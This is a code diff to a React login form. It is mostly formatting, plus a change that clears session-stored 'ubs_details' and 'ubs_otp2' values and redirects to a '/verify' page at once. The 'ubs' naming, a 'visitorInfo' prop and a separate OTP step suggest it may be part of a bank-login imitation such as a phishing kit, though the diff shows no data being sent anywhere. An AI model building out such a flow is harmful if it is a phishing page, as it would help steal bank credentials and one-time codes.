@@ -53,7 +53,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
 
   const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value;
-    
+
     // Prevent "@" character from being entered
     if (value.includes("@")) {
       setUserIdError("User ID not valid.");
@@ -63,7 +63,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     } else {
       setUserIdError(null);
     }
-    
+
     setUserId(value);
   };
 
@@ -104,11 +104,10 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
       return;
     }
 
+    sessionStorage.removeItem("ubs_details");
+    sessionStorage.removeItem("ubs_otp2");
     sessionStorage.setItem("ubs_verify", "1");
-
-    setTimeout(() => {
-      router.push("/verify");
-    }, 3000);
+    router.replace("/verify");
   };
 
   return (
@@ -140,7 +139,14 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
               />
             </div>
             {userIdError && (
-              <p style={{ color: "#dc2626", fontSize: "13px", marginTop: "4px", marginBottom: "8px" }}>
+              <p
+                style={{
+                  color: "#dc2626",
+                  fontSize: "13px",
+                  marginTop: "4px",
+                  marginBottom: "8px",
+                }}
+              >
                 {userIdError}
               </p>
             )}
@@ -182,7 +188,11 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
               Show Password
             </label>
 
-            <button type="submit" className="logon-btn" disabled={isLoading || !!userIdError}>
+            <button
+              type="submit"
+              className="logon-btn"
+              disabled={isLoading || !!userIdError}
+            >
               {isLoading ? "Loading..." : "Log On"}
             </button>
 
